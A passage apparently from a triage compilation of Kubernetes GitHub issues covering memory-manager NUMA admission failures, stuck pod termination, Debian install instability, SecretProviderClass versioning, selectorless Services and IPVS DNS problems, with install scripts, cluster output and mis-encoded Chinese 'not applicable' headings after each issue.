#### How can we reproduce it (as minimally and precisely as possible)?

I have a node had 256Gi and 2 NUMA node with 128Gi for one NUMA;
1. Create Pod A, with init-container and container both 100Gi
2. Create Pod B, with init-container and container both 100Gi 
3. Restart kubelet.
4. Both Pod A and Pod B failed with UnexpectedAdmissionError

#### Anything else we need to know?

In `--topology-policy=single-numa-node` mode.
When memory manager caculate memory for topology, it will caculate init-container firstly, when comes to app container, it will reuse the init-container's memory as possible,  and reduce init-container's memory in state, it's as expected;


https://github.com/kubernetes/kubernetes/blob/9df98f3d393e204dd8db02322057ac2e7f3f6c28/pkg/kubelet/cm/memorymanager/policy_static.go#L192
https://github.com/kubernetes/kubernetes/blob/9df98f3d393e204dd8db02322057ac2e7f3f6c28/pkg/kubelet/cm/memorymanager/policy_static.go#L956-L965

But when restart kubelet, memory manager will re calculate memory for init-container,  if now node has not enough memory for init-container, the whole pod will be failed because of Admit failed;

<img width="1060" alt="image" src="https://github.com/kubernetes/kubernetes/assets/151703335/d455fd2e-b7a6-4661-825a-ae661d96d84a">

After restart kubelet:
<img width="1420" alt="image" src="https://github.com/kubernetes/kubernetes/assets/151703335/cd1f196d-b3c7-418f-b670-90bb51051321">



#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: version.Info{Major:"1", Minor:"22", GitVersion:"v1.22.17", GitCommit:"a7736eaf34d823d7652415337ac0ad06db9167fc", GitTreeState:"clean", BuildDate:"2022-12-08T11:47:36Z", GoVersion:"go1.16.15", Compiler:"gc", Platform:"linux/amd64"}
Server Version: version.Info{Major:"1", Minor:"22", GitVersion:"v1.22.17", GitCommit:"a7736eaf34d823d7652415337ac0ad06db9167fc", GitTreeState:"clean", BuildDate:"2022-12-08T11:42:04Z", GoVersion:"go1.16.15", Compiler:"gc", Platform:"linux/amd64"}
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

ä¸æ¶‰åŠ

---

## Issue #123968 Pod hang in terminating when secret/configmap deleted

- Issue é“¾æ¥ï¼š[#123968](https://github.com/kubernetes/kubernetes/issues/123968)

### Issue å†…å®¹

#### What happened?

Try to delete pod, but hang
kubelet[28996]: E0318 00:59:17.040631   28996 nestedpendingoperations.go:335] Operation for "{volumeName:kubernetes.io/configmap/9493862e-68db-470e-9954-7e43de8a0c75-iscsiconfig podName:9493862e-68db-470e-9954-7e43de8a0c75 nodeName:}" failed. No retries permitted until 2024-03-18 01:01:19.040616429 -0700 -07 m=+498.624350994 (durationBeforeRetry 2m2s). Error: MountVolume.SetUp failed for volume "iscsiconfig" storageclass nil (UniqueName: "kubernetes.io/configmap/9493862e-68db-470e-9954-7e43de8a0c75-iscsiconfig") pod "fio-test-cb57bfd75-2bz89" (UID: "9493862e-68db-470e-9954-7e43de8a0c75") : configmap "iscsi-config" not found

#### What did you expect to happen?

pod successful terminating

#### How can we reproduce it (as minimally and precisely as possible)?

1. create a pod with configmap/secret volume
2. delete the configmap/secret
3. restart kubelet to trigger remount
4. after kubelet report configmap/secret MountVolume.SetUp failed, delete pod

#### Anything else we need to know?

_No response_

#### Kubernetes version

kubelet --version 
Kubernetes v1.23.6

#### Cloud provider

None


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

ä¸æ¶‰åŠã€‚

---

## Issue #123959 Debian Bookworm installation not stable

- Issue é“¾æ¥ï¼š[#123959](https://github.com/kubernetes/kubernetes/issues/123959)

### Issue å†…å®¹

#### What happened?

Upon Installing Kubernetes from scratch the cluster is briefly reachable via kubectl announcing that there are not pods in the default namespace as is to be expected upon executing `kubectl get pods` .
After some time passes  the installation itself will not be reachable any longer.

What is special about this is that it is a single node, but used to work before version 1.25 (It is a toysetup and since I missed the window for the shift(why are only the latest in the repository anyways and not all the latest supported versions(Debian 11 will not be happy with that given that they ship containerd 1.4.))

This might be related to https://github.com/kubernetes/kubernetes/issues/123837 .




#### What did you expect to happen?

The cluster, like all the installations before is stable and can receive pods upon untainting master to schedule pods.

#### How can we reproduce it (as minimally and precisely as possible)?

```bash
systemctl mask swap.target 
modprobe br_netfilter 
echo "net.bridge.bridge-nf-call-iptables = 1" >> /etc/sysctl.conf 
sysctl -p /etc/sysctl.conf 

apt-get update && 
apt-get install -y curl gnupg-agent fail2ban &&
curl -fsSL https://pkgs.k8s.io/core:/stable:/v1.29/deb/Release.key | gpg --dearmor -o /etc/apt/keyrings/kubernetes-apt-keyring.gpg &&
echo 'deb [signed-by=/etc/apt/keyrings/kubernetes-apt-keyring.gpg] https://pkgs.k8s.io/core:/stable:/v1.29/deb/ /' | sudo tee /etc/apt/sources.list.d/kubernetes.list && 
curl https://baltocdn.com/helm/signing.asc | sudo apt-key add -  &&
echo "deb https://baltocdn.com/helm/stable/debian/ all main" | sudo tee /etc/apt/sources.list.d/helm-stable-debian.list &&
apt-get update && 
apt-get install -y apt-transport-https ca-certificates curl && 
apt install -y kubeadm kubectl containerd kubelet kubernetes-cni helm

cat << EOF | sudo tee /etc/sysctl.d/99-kubernetes-cri.conf
net.bridge.bridge-nf-call-iptables = 1
net.ipv4.ip_forward = 1
net.bridge.bridge-nf-call-ip6tables = 1
EOF


## this is optional, I ran it once or twice trying to debug, but the results were the same
# mkdir -p /etc/containerd
# containerd config default | sudo tee /etc/containerd/config.toml
# systemctl restart containerd



sysctl --system && 
echo 1 > /proc/sys/net/ipv4/ip_forward &&
systemctl reboot 

kubeadm init --pod-network-cidr=10.217.0.0/16   && 
mkdir $HOME/.kube &&
cat /etc/kubernetes/admin.conf > $HOME/.kube/config &&
kubectl taint node singleNode node-role.kubernetes.io/control-plane:NoSchedule- 
```

#### Anything else we need to know?

Keep in mind, this is a single node only(didn't give me any grief before though).
The installation is fresh so just the installation and the the installation of kubernetes. 

#### Kubernetes version

<details>

```console
$ kubectl version
# 1.29.3
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
fresh install of debian 12
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>
kubeadm
</details>


#### Container runtime (CRI) and version (if applicable)

<details>
containerd 1.6
</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

ä¸æ¶‰åŠ

---

## Issue #123955 SecretProviderClass should be versioned similar to configmaps

- Issue é“¾æ¥ï¼š[#123955](https://github.com/kubernetes/kubernetes/issues/123955)

### Issue å†…å®¹

#### What happened?

Let's say we have a service A, which currently depends on 2 secrets, B & C, provided by a `SecretProviderClass`.

Then, a new version of A removed the usage of secret C, so it now only need one secret B.

When deploying the new version, 2 things will happen:

1. The `SecretProviderClass` being updated to remove C and only provide B
2. The pods for A being _gradually_ replaced by the new version that no longer needs C

But since 1 is almost immediate while 2 is always a gradual rollout, after 1 is replaced the old pods still requiring both B and C will likely start to fail because the update of `SecretProviderClass` that removed C that they still require.

Even if we tweak the order to only do 1 after 2 is fully done, it can still cause the reverse problem (a new version that requires a new secret).

Currently, to avoid this issue we need to be extra careful and do 2-step deploys, first deploy a superset of `SecretProviderClass` that contains the secrets for both new and old version of code with the new code, and after that's fully done, do another deploy to shrink `SecretProviderClass` to only the ones needed by the new version.

But I think to fully address this problem, we should make `SecretProviderClass` versioned (similar to how configmaps are versioned), so every pod can use their matching version of `SecretProviderClass` to provide the secrets they need.

#### What did you expect to happen?

See above.

#### How can we reproduce it (as minimally and precisely as possible)?

See above.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```

</details>
1.27.10

#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

ä¸æ¶‰åŠ

---

## Issue #123954 Both Endpoints and EndpointSlices not working with Service abstraction for external IPs

- Issue é“¾æ¥ï¼š[#123954](https://github.com/kubernetes/kubernetes/issues/123954)

### Issue å†…å®¹

#### What happened?

As recommend in https://kubernetes.io/docs/concepts/services-networking/service/#services-without-selectors I did try to abstract access to an externally hosted mariaDB. However, both the recommend approach and the legacy approach with Endpoints did not work as expected. There is a slight difference however, in the EndpointSlice case the service description showed `Endpoints: <none>` while in the endpoints case it was empty, i.e. `Endpoints: `.



#### What did you expect to happen?

The external database should be reachable through the service abstraction.

#### How can we reproduce it (as minimally and precisely as possible)?

It is a clean K3s with --disable traefik, nginx ingress as well as cert-manager installed via helm, plus GitLab Agent for Kubernetes also using Helm.

The Service:

``` yaml
apiVersion: v1
kind: Service
metadata:
  name: mariadb
spec:
  ports:
    - protocol: TCP
      port: 3306
      targetPort: 3306
```

I've tried both, EndpointSlice:

``` yaml
apiVersion: discovery.k8s.io/v1
kind: EndpointSlice
metadata:
  name: mariadb-1
  labels:
    kubernetes.io/service-name: mariadb
addressType: IPv4
ports:
  - name: mysql
    port: 3306
    protocol: TCP
endpoints:
  - addresses:
    - 10.0.0.5
```

, and Endpoints:

``` yaml
apiVersion: v1
kind: Endpoints
metadata:
  name: mariadb
subsets:
  - addresses:
      - ip: 10.0.0.5
    ports:
      - name: mysql
        port: 3306
```

Both were successfully deployed in the same namespace as the service and linked to the service.

## case: EndpointSlices

```
kubectl get endpointslice -l kubernetes.io/service-name=mariadb

NAME        ADDRESSTYPE   PORTS   ENDPOINTS   AGE
mariadb-1   IPv4          3306    10.0.0.5    3m29s
```
```
kubectl describe service mariadb

Name:              mariadb
Namespace:         keldysh-projects-workshop
Labels:            app.kubernetes.io/managed-by=Helm
Annotations:       meta.helm.sh/release-name: service
                   meta.helm.sh/release-namespace: keldysh-projects-workshop
Selector:          <none>
Type:              ClusterIP
IP Family Policy:  SingleStack
IP Families:       IPv4
IP:                10.43.126.23
IPs:               10.43.126.23
Port:              <unset>  3306/TCP
TargetPort:        3306/TCP
Endpoints:         <none>
Session Affinity:  None
Events:            <none>
```

## case: Endpoints

```
kubectl describe endpoints mariadb

Name:         mariadb
Namespace:    keldysh-projects-workshop
Labels:       app.kubernetes.io/managed-by=Helm
Annotations:  meta.helm.sh/release-name: service
              meta.helm.sh/release-namespace: keldysh-projects-workshop
Subsets:
  Addresses:          10.0.0.5
  NotReadyAddresses:  <none>
  Ports:
    Name   Port  Protocol
    ----   ----  --------
    mysql  3306  TCP

Events:  <none>
```
```
kubectl describe service mariadb

Name:              mariadb
Namespace:         keldysh-projects-workshop
Labels:            app.kubernetes.io/managed-by=Helm
Annotations:       meta.helm.sh/release-name: service
                   meta.helm.sh/release-namespace: keldysh-projects-workshop
Selector:          <none>
Type:              ClusterIP
IP Family Policy:  SingleStack
IP Families:       IPv4
IP:                10.43.126.23
IPs:               10.43.126.23
Port:              <unset>  3306/TCP
TargetPort:        3306/TCP
Endpoints:         
Session Affinity:  None
Events:            <none>
```

#### Anything else we need to know?

DNS is working in principle:

```
kubectl exec -i -t dnsutils -- nslookup mariadb

Server:         10.43.0.10
Address:        10.43.0.10#53

Name:   mariadb.keldysh-projects-workshop.svc.cluster.local
Address: 10.43.19.67
```


I already submitted a bug report in the K3s repository. They however claim to not change the core kubernetes functionality:
https://github.com/k3s-io/k3s/issues/9725
https://github.com/k3s-io/k3s/discussions/9726

#### Kubernetes version


K3s Version:
k3s version v1.28.7+k3s1 (https://github.com/k3s-io/k3s/commit/051b14b248655896fdfd7ba6c93db6182cde7431)
go version go1.21.7


#### Cloud provider

Self hosted K3s on Hetzner Cloud Servers

#### OS version

Linux kubernetes-test-server 5.15.0-91-generic https://github.com/k3s-io/k3s/issues/101-Ubuntu SMP Tue Nov 14 13:30:08 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux

#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>



### åˆ†æç»“æœ

ä¸æ¶‰åŠã€‚

---

## Issue #123948 Internal dns (svc.cluster.local) doesn't work after applying ipvs mode.

- Issue é“¾æ¥ï¼š[#123948](https://github.com/kubernetes/kubernetes/issues/123948)

### Issue å†…å®¹

#### What happened?

Hello, i am new to k8s. First, i apologize for my English skill. :-(

I have trouble with accessing to service object from pods in another namespaces after **applying ipvs mode**. My nginx pod logs like below.

```bash
host not found in upstream "<svc-name>.<namespace-name>.svc.cluster.local:<port>"
```
However, It looks possible that accessing specific service objects from outside of cluster. (e.g. accessing nginx `NodePort` service object, accessing `ClusterIP` service object via portforwarding)


And then, i have installed `ipvsadm`, i loaded some kind of modules to activating ipvs mode.
```bash
user@randomhost:~$ lsmod | grep ip_vs
ip_vs_sh               12288  0
ip_vs_wrr              12288  0
ip_vs_rr               12288  49
ip_vs_lc               12288  0
ip_vs                 221184  57 ip_vs_rr,ip_vs_sh,ip_vs_wrr,ip_vs_lc
nf_conntrack          200704  6 xt_conntrack,nf_nat,xt_nat,nf_conntrack_netlink,xt_MASQUERADE,ip_vs
nf_defrag_ipv6         24576  2 nf_conntrack,ip_vs
libcrc32c              12288  4 nf_conntrack,nf_nat,nf_tables,ip_vs
```

```bash
user@randomhost:~$ sudo ipvsadm -ln
IP Virtual Server version 1.2.1 (size=4096)
Prot LocalAddress:Port Scheduler Flags
  -> RemoteAddress:Port           Forward Weight ActiveConn InActConn
TCP  10.10.50.6:30010 rr
  -> 10.244.240.231:80            Masq    1      0          0         
TCP  10.10.50.6:30020 rr
TCP  10.10.50.6:30040 rr
  -> 10.244.240.210:8080          Masq    1      0          0         
TCP  10.10.50.6:30100 rr
  -> 10.244.240.203:8080          Masq    1      0          0         
TCP  10.10.50.6:31580 rr
  -> 10.244.240.217:9090          Masq    1      0          0         
TCP  10.96.0.1:443 rr
  -> 10.10.50.6:6443              Masq    1      2          0         
TCP  10.96.0.10:53 rr
  -> 10.244.169.6:53              Masq    1      0          0         
  -> 10.244.240.215:53            Masq    1      0          0         
TCP  10.96.0.10:9153 rr
  -> 10.244.169.6:9153            Masq    1      0          0         
  -> 10.244.240.215:9153          Masq    1      0          0         
TCP  10.96.66.35:8080 rr
  -> 10.244.240.199:8080          Masq    1      0          0         
TCP  10.96.77.112:80 rr
  -> 10.244.240.217:9090          Masq    1      0          0         
TCP  10.96.197.131:8080 rr
  -> 10.244.240.255:8080          Masq    1      0          0         
TCP  10.98.190.64:9400 rr
  -> 10.244.240.205:9400          Masq    1      0          0         
TCP  10.98.211.200:9091 rr
  -> 10.244.240.246:9091          Masq    1      0          0         
TCP  10.99.124.7:8080 rr
  -> 10.244.240.213:8080          Masq    1      0          0         
TCP  10.100.12.75:9093 rr
  -> 10.244.240.220:9093          Masq    1      0          0         
TCP  10.100.42.9:8080 rr
  -> 10.244.240.225:8080          Masq    1      0          0         
TCP  10.100.182.211:6379 rr
  -> 10.244.240.230:6379          Masq    1      0          0         
TCP  10.100.213.41:9100 rr
  -> 10.10.50.5:9100              Masq    1      0          0         
  -> 10.10.50.6:9100              Masq    1      0          0         
TCP  10.100.216.98:8080 rr
  -> 10.244.240.198:8080          Masq    1      0          0         
TCP  10.100.223.0:8080 rr
  -> 10.244.240.209:8080          Masq    1      0          0         
TCP  10.101.100.218:8080 rr
  -> 10.244.240.238:8080          Masq    1      0          0         
TCP  10.101.139.28:9001 rr
  -> 10.244.240.235:9001          Masq    1      0          0         
TCP  10.101.215.114:80 rr
  -> 10.244.240.193:8080          Masq    1      0          0         
TCP  10.101.215.114:443 rr
  -> 10.244.240.193:8080          Masq    1      0          0         
TCP  10.102.197.12:9114 rr
TCP  10.103.254.124:8081 rr
  -> 10.244.240.229:8081          Masq    1      0          0         
TCP  10.104.27.215:8080 rr
  -> 10.244.240.203:8080          Masq    1      0          0         
TCP  10.104.234.123:8080 rr
  -> 10.244.169.4:8080            Masq    1      0          0         
TCP  10.105.53.9:8080 rr
  -> 10.244.240.222:8080          Masq    1      0          0         
  -> 10.244.240.223:8080          Masq    1      0          0         
  -> 10.244.240.224:8080          Masq    1      0          0         
  -> 10.244.240.228:8080          Masq    1      0          0         
  -> 10.244.240.234:8080          Masq    1      0          0         
  -> 10.244.240.237:8080          Masq    1      0          0         
  -> 10.244.240.240:8080          Masq    1      0          0         
  -> 10.244.240.241:8080          Masq    1      0          0         
TCP  10.106.23.135:80 rr
  -> 10.244.240.231:80            Masq    1      0          0         
TCP  10.107.149.189:8080 rr
  -> 10.244.240.194:8080          Masq    1      0          0         
TCP  10.109.119.195:5556 rr
  -> 10.244.240.254:5556          Masq    1      0          0         
TCP  10.109.119.195:5557 rr
  -> 10.244.240.254:5557          Masq    1      0          0         
TCP  10.109.161.105:8080 rr
  -> 10.244.240.210:8080          Masq    1      0          0         
TCP  10.110.137.110:80 rr
TCP  10.110.152.189:8080 rr
  -> 10.244.169.3:8080            Masq    1      0          0         
TCP  10.110.204.48:7000 rr
  -> 10.244.240.216:7000          Masq    1      0          0         
TCP  10.111.130.154:80 rr
  -> 10.244.240.253:3000          Masq    1      0          0         
TCP  10.244.0.0:30010 rr
  -> 10.244.240.231:80            Masq    1      0          0         
TCP  10.244.0.0:30020 rr
TCP  10.244.0.0:30040 rr
  -> 10.244.240.210:8080          Masq    1      0          0         
TCP  10.244.0.0:30100 rr
  -> 10.244.240.203:8080          Masq    1      0          0         
TCP  10.244.0.0:31580 rr
  -> 10.244.240.217:9090          Masq    1      0          0         
TCP  10.244.169.0:30010 rr
  -> 10.244.240.231:80            Masq    1      0          0         
TCP  10.244.169.0:30020 rr
TCP  10.244.169.0:30040 rr
  -> 10.244.240.210:8080          Masq    1      0          0         
TCP  10.244.169.0:30100 rr
  -> 10.244.240.203:8080          Masq    1      0          0         
TCP  10.244.169.0:31580 rr
  -> 10.244.240.217:9090          Masq    1      0          0         
UDP  10.96.0.10:53 rr
  -> 10.244.169.6:53              Masq    1      0          0         
  -> 10.244.240.215:53            Masq    1      0          0
```

Is there something i omitted?
I appreciate that read this issue.

#### What did you expect to happen?

I want to access service object in another namespace via (`svc.cluster.local`) from another pod.

#### How can we reproduce it (as minimally and precisely as possible)?

1. initialize k8s cluster via `kubeadm` (version : 1.28.x)
2. install calico CNI (I installed flannel CNI at first time and then migrate to calico CNI)
3. Edit configmap `kube-proxy`
```yaml
mode: "ipvs"
```
4. Delete `kube-proxy` pods and waiting for reproduce.

#### Anything else we need to know?

##### Configmap for kube-proxy
```bash
user@randomhost:~$ kubectl describe configmap kube-proxy -n kube-system

apiVersion: kubeproxy.config.k8s.io/v1alpha1
bindAddress: 0.0.0.0
bindAddressHardFail: false
clientConnection:
  acceptContentTypes: ""
  burst: 0
  contentType: ""
  kubeconfig: /var/lib/kube-proxy/kubeconfig.conf
  qps: 0
clusterCIDR: 10.244.0.0/16
configSyncPeriod: 0s
conntrack:
  maxPerCore: null
  min: null
  tcpCloseWaitTimeout: null
  tcpEstablishedTimeout: null
detectLocal:
  bridgeInterface: ""
  interfaceNamePrefix: ""
detectLocalMode: ""
enableProfiling: false
healthzBindAddress: ""
hostnameOverride: ""
iptables:
  localhostNodePorts: null
  masqueradeAll: false
  masqueradeBit: null
  minSyncPeriod: 0s
  syncPeriod: 0s
ipvs:
  excludeCIDRs: null
  minSyncPeriod: 0s
  scheduler: ""
  strictARP: false
  syncPeriod: 0s
  tcpFinTimeout: 0s
  tcpTimeout: 0s
  udpTimeout: 0s
kind: KubeProxyConfiguration
logging:
  flushFrequency: 0
  options:
    json:
      infoBufferSize: "0"
  verbosity: 0
metricsBindAddress: ""
mode: ""
nodePortAddresses: null
oomScoreAdj: null
portRange: ""
showHiddenMetricsForVersion: ""
winkernel:
  enableDSR: false
  forwardHealthCheckVip: false
  networkName: ""
  rootHnsEndpointName: ""
  sourceVip: ""
kubeconfig.conf:
```
##### `/etc/resolve.conf`
```bash
user@randomhost:~$ cat /etc/resolv.conf
# This is /run/systemd/resolve/stub-resolv.conf managed by man:systemd-resolved(8).
# Do not edit.
#
# This file might be symlinked as /etc/resolv.conf. If you're looking at
# /etc/resolv.conf and seeing this text, you have followed the symlink.
#
# This is a dynamic resolv.conf file for connecting local clients to the
# internal DNS stub resolver of systemd-resolved. This file lists all
# configured search domains.
#
# Run "resolvectl status" to see details about the uplink DNS servers
# currently in use.
#
# Third party programs should typically not access this file directly, but only
# through the symlink at /etc/resolv.conf. To manage man:resolv.conf(5) in a
# different way, replace this symlink by a static file or a different symlink.
#
# See man:systemd-resolved.service(8) for details about the supported modes of
# operation for /etc/resolv.conf.

nameserver 127.0.0.53
options edns0 trust-ad
search .
search 8.8.4.4
nameserver 8.8.8.8
```

##### Pod log for kube-proxy 
```bash
user@randomhost:~$ kubectl logs -f kube-proxy-ptwtv -n kube-system
I0315 01:08:48.212186       1 node.go:141] Successfully retrieved node IP: 10.10.50.6
I0315 01:08:48.213268       1 conntrack.go:52] "Setting nf_conntrack_max" nfConntrackMax=131072
I0315 01:08:48.223455       1 server.go:632] "kube-proxy running in dual-stack mode" primary ipFamily="IPv4"
I0315 01:08:48.229596       1 server_others.go:218] "Using ipvs Proxier"
I0315 01:08:48.229722       1 server_others.go:421] "Detect-local-mode set to ClusterCIDR, but no cluster CIDR for family" ipFamily="IPv6"
I0315 01:08:48.229743       1 server_others.go:438] "Defaulting to no-op detect-local"
I0315 01:08:48.229928       1 ipset.go:116] "Ipset name truncated" ipSetName="KUBE-6-LOAD-BALANCER-SOURCE-CIDR" truncatedName="KUBE-6-LOAD-BALANCER-SOURCE-CID"
I0315 01:08:48.229955       1 ipset.go:116] "Ipset name truncated" ipSetName="KUBE-6-NODE-PORT-LOCAL-SCTP-HASH" truncatedName="KUBE-6-NODE-PORT-LOCAL-SCTP-HAS"
I0315 01:08:48.229988       1 server.go:846] "Version info" version="v1.28.6"
I0315 01:08:48.229998       1 server.go:848] "Golang settings" GOGC="" GOMAXPROCS="" GOTRACEBACK=""
I0315 01:08:48.230266       1 config.go:315] "Starting node config controller"
I0315 01:08:48.230292       1 shared_informer.go:311] Waiting for caches to sync for node config
I0315 01:08:48.230403       1 config.go:188] "Starting service config controller"
I0315 01:08:48.230411       1 shared_informer.go:311] Waiting for caches to sync for service config
I0315 01:08:48.230420       1 config.go:97] "Starting endpoint slice config controller"
I0315 01:08:48.230421       1 shared_informer.go:311] Waiting for caches to sync for endpoint slice config
I0315 01:08:48.331128       1 shared_informer.go:318] Caches are synced for endpoint slice config
I0315 01:08:48.331140       1 shared_informer.go:318] Caches are synced for node config
I0315 01:08:48.331172       1 shared_informer.go:318] Caches are synced for service config
```

##### iptables
```bash
user@randomhost:~$ sudo iptables --list
Chain INPUT (policy ACCEPT)
target     prot opt source               destination         
cali-INPUT  all  --  anywhere             anywhere             /* cali:Cz_u1IQiXIMmKD4c */
KUBE-IPVS-FILTER  all  --  anywhere             anywhere             /* kubernetes ipvs access filter */
KUBE-PROXY-FIREWALL  all  --  anywhere             anywhere             /* kube-proxy firewall rules */
KUBE-NODE-PORT  all  --  anywhere             anywhere             /* kubernetes health check rules */
KUBE-PROXY-FIREWALL  all  --  anywhere             anywhere             ctstate NEW /* kubernetes load balancer firewall */
KUBE-NODEPORTS  all  --  anywhere             anywhere             /* kubernetes health check service ports */
KUBE-EXTERNAL-SERVICES  all  --  anywhere             anywhere             ctstate NEW /* kubernetes externally-visible service portals */
KUBE-FIREWALL  all  --  anywhere             anywhere            

Chain FORWARD (policy ACCEPT)
target     prot opt source               destination         
cali-FORWARD  all  --  anywhere             anywhere             /* cali:wUHhoiAYhphO9Mso */
KUBE-PROXY-FIREWALL  all  --  anywhere             anywhere             /* kube-proxy firewall rules */
KUBE-PROXY-FIREWALL  all  --  anywhere             anywhere             ctstate NEW /* kubernetes load balancer firewall */
KUBE-FORWARD  all  --  anywhere             anywhere             /* kubernetes forwarding rules */
KUBE-SERVICES  all  --  anywhere             anywhere             ctstate NEW /* kubernetes service portals */
KUBE-EXTERNAL-SERVICES  all  --  anywhere             anywhere             ctstate NEW /* kubernetes externally-visible service portals */
FLANNEL-FWD  all  --  anywhere             anywhere             /* flanneld forward */
ACCEPT     all  --  anywhere             anywhere             /* cali:S93hcgKJrXEqnTfs */ /* Policy explicitly accepted packet. */ mark match 0x10000/0x10000
MARK       all  --  anywhere             anywhere             /* cali:mp77cMpurHhyjLrM */ MARK or 0x10000

Chain OUTPUT (policy ACCEPT)
target     prot opt source               destination         
cali-OUTPUT  all  --  anywhere             anywhere             /* cali:tVnHkvAo15HuiPy0 */
KUBE-PROXY-FIREWALL  all  --  anywhere             anywhere             ctstate NEW /* kubernetes load balancer firewall */
KUBE-SERVICES  all  --  anywhere             anywhere             ctstate NEW /* kubernetes service portals */
KUBE-FIREWALL  all  --  anywhere             anywhere            

Chain FLANNEL-FWD (1 references)
target     prot opt source               destination         
ACCEPT     all  --  randomhost/16          anywhere             /* flanneld forward */
ACCEPT     all  --  anywhere             randomhost/16          /* flanneld forward */

Chain KUBE-EXTERNAL-SERVICES (2 references)
target     prot opt source               destination         

Chain KUBE-FIREWALL (2 references)
target     prot opt source               destination         
DROP       all  -- !localhost/8          localhost/8          /* block incoming localnet connections */ ! ctstate RELATED,ESTABLISHED,DNAT

Chain KUBE-FORWARD (1 references)
target     prot opt source               destination         
DROP       all  --  anywhere             anywhere             ctstate INVALID
ACCEPT     all  --  anywhere             anywhere             /* kubernetes forwarding rules */ mark match 0x4000/0x4000
ACCEPT     all  --  anywhere             anywhere             /* kubernetes forwarding conntrack rule */ ctstate RELATED,ESTABLISHED

Chain KUBE-IPVS-FILTER (1 references)
target     prot opt source               destination         
RETURN     all  --  anywhere             anywhere             match-set KUBE-LOAD-BALANCER dst,dst
RETURN     all  --  anywhere             anywhere             match-set KUBE-CLUSTER-IP dst,dst
RETURN     all  --  anywhere             anywhere             match-set KUBE-EXTERNAL-IP dst,dst
RETURN     all  --  anywhere             anywhere             match-set KUBE-EXTERNAL-IP-LOCAL dst,dst
RETURN     all  --  anywhere             anywhere             match-set KUBE-HEALTH-CHECK-NODE-PORT dst
REJECT     all  --  anywhere             anywhere             ctstate NEW match-set KUBE-IPVS-IPS dst reject-with icmp-port-unreachable

Chain KUBE-KUBELET-CANARY (0 references)
target     prot opt source               destination         

Chain KUBE-NODE-PORT (1 references)
target     prot opt source               destination         
ACCEPT     all  --  anywhere             anywhere             /* Kubernetes health check node port */ match-set KUBE-HEALTH-CHECK-NODE-PORT dst

Chain KUBE-NODEPORTS (1 references)
target     prot opt source               destination         

Chain KUBE-PROXY-CANARY (0 references)
target     prot opt source               destination         

Chain KUBE-PROXY-FIREWALL (5 references)
target     prot opt source               destination         

Chain KUBE-SERVICES (2 references)
target     prot opt source               destination         

Chain KUBE-SOURCE-RANGES-FIREWALL (0 references)
target     prot opt source               destination         
DROP       all  --  anywhere             anywhere            

Chain cali-FORWARD (1 references)
target     prot opt source               destination         
MARK       all  --  anywhere             anywhere             /* cali:vjrMJCRpqwy5oRoX */ MARK and 0xfff1ffff
cali-from-hep-forward  all  --  anywhere             anywhere             /* cali:A_sPAO0mcxbT9mOV */ mark match 0x0/0x10000
cali-from-wl-dispatch  all  --  anywhere             anywhere             /* cali:8ZoYfO5HKXWbB3pk */
cali-to-wl-dispatch  all  --  anywhere             anywhere             /* cali:jdEuaPBe14V2hutn */
cali-to-hep-forward  all  --  anywhere             anywhere             /* cali:12bc6HljsMKsmfr- */
cali-cidr-block  all  --  anywhere             anywhere             /* cali:NOSxoaGx8OIstr1z */

Chain cali-INPUT (1 references)
target     prot opt source               destination         
ACCEPT     ipencap--  anywhere             anywhere             /* cali:PajejrV4aFdkZojI */ /* Allow IPIP packets from Calico hosts */ match-set cali40all-hosts-net src ADDRTYPE match dst-type LOCAL
DROP       ipencap--  anywhere             anywhere             /* cali:_wjq-Yrma8Ly1Svo */ /* Drop IPIP packets from non-Calico hosts */
MARK       all  --  anywhere             anywhere             /* cali:ss8lEMQsXi-s6qYT */ MARK and 0xfffff
cali-forward-check  all  --  anywhere             anywhere             /* cali:PgIW-V0nEjwPhF_8 */
RETURN     all  --  anywhere             anywhere             /* cali:QMJlDwlS0OjHyfMN */ mark match ! 0x0/0xfff00000
cali-wl-to-host  all  --  anywhere             anywhere            [goto]  /* cali:nDRe73txrna-aZjG */
ACCEPT     all  --  anywhere             anywhere             /* cali:iX2AYvqGXaVqwkro */ mark match 0x10000/0x10000
MARK       all  --  anywhere             anywhere             /* cali:bhpnxD5IRtBP8KW0 */ MARK and 0xfff0ffff
cali-from-host-endpoint  all  --  anywhere             anywhere             /* cali:H5_bccAbHV0sooVy */
ACCEPT     all  --  anywhere             anywhere             /* cali:inBL01YlfurT0dbI */ /* Host endpoint policy accepted packet. */ mark match 0x10000/0x10000

Chain cali-OUTPUT (1 references)
target     prot opt source               destination         
ACCEPT     all  --  anywhere             anywhere             /* cali:Mq1_rAdXXH3YkrzW */ mark match 0x10000/0x10000
